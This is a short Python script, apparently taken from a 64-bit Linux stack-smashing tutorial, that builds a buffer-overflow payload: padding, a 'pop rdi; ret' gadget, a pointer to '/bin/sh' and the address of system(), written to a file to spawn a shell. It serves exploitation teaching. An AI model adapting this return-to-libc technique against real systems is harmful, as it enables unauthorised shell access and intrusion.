# https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/

#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*104                              # junk
buf += pack("<Q", 0x00000000004006a3)       # pop rdi; ret;
buf += pack("<Q", 0x4006ff)                 # pointer to "/bin/sh" gets popped into rdi
buf += pack("<Q", 0x7ffff7a52390)           # address of system()

f = open("in.txt", "w")
f.write(buf)
